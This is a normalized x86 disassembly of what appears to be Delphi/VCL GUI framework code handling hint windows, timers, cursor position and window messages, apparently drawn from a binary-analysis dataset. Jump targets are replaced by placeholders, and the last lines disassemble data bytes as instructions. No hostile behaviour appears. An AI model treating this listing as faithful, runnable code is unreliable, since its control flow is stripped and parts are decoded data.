mov [ fs : eax ] edx
push sub_46f7c6
lea eax [ ebp - 0x108 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
call sub_4087a0
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402db8
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402bd0
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404374
sub_46f7dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_4561f0
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_456358
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46fe80
test al al
je r-xdata
call sub_456054
mov ebp eax
mov eax edi
call sub_456054
mov ebp eax
mov eax esi
call sub_46fe80
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46f944
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46f99c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46fe80
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4706cc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9a3
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_46f9ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46fa04
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46fe80
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4706cc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa0b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_46fa1c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4032b0
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44f9f4
jmp r-xdata
sub_46fa6c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46d018
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_456054
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46d004
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
call sub_456054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46fad0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44e100
mov edi eax
call sub_44c9fc
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_450a20
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_450a20
sub_46fb48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46fc58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46fad0
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46db80
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_44c9b8
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46fd08
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_46fbff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4700a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46fa6c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420c3c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fc5f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46fc68
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46cffc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46cfe8
movzx edx di
xor ecx ecx
call sub_450a20
inc esi
dec ebx
jne r-xdata
sub_46fca4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46edc0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46edc0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46fc68
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46fd08
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4044b8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_404100
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_449380
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45c390
xor eax eax
push ebp
push sub_46fd8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46fd9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46fdf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46cffc
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_46fd9c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46cfe8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46fd9c
pop ecx
jmp r-xdata
mov eax ebx
call sub_456358
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_456054
push eax
call IsChild
test eax eax
jne r-xdata
sub_46fe80
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405944
call sub_42b6cc
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_46fea8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46feec
push sub_46dbd8
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4700a0
sub_46ff14
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cdc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44f36c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_44e100
call sub_46dbb8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4700a0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cdc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44f36c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4700a0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46fea8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_450a20
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_470338
jmp r-xdata
sub_470024
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46feec
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_470338
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_47005c
jmp r-xdata
sub_47005c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_456054
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_456054
push eax
call ShowWindow
sub_4700a0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_47005c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_46dd40
mov eax ebx
call sub_46feec
sub_4700d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_47021a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_4268c4
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407e80
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4701eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_42697c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4701f2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4700c8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4700c8
mov [ ebp - 0x4 ] eax
sub_4701f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_47022c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4032b0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031f8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_47028c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_470326
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47032d
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40419c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4254a8
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c6c0
mov ebx eax
inc ebx
sub_470338
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a44
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4706be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4700a0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46fea8
jmp r-xdata
call sub_466554
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4706c5
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404b08
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_44e100
call sub_46dbb8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_4700d8
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_46cf7c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44f1f4
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44f398
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_46db80
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_44c974
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404144
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_450a20
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_47022c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4034ac
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44f36c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44f36c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44f9f4
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_46dccc
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_47028c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46fea8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46fea8
jmp r-xdata
sub_4706cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_404100
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_404100
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_470708
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_450a20
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_450a20
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_45c258
sub_470798
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4707c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_470864
add [ eax ] eax
add [ eax ] al
aam 0xce
dec eax
add [ esi + edi * 4 + 0x44 ] ch
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4708c7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4708ce
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_466300
mov eax sub_466580
call sub_418358
mov eax [ rw-data ]
push eax
call CloseHandle
sub_47094c
cwde
or [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
or [ edi ] eax
or al 0x0
add [ eax ] al
push 0xe0004072
xor al 0x40
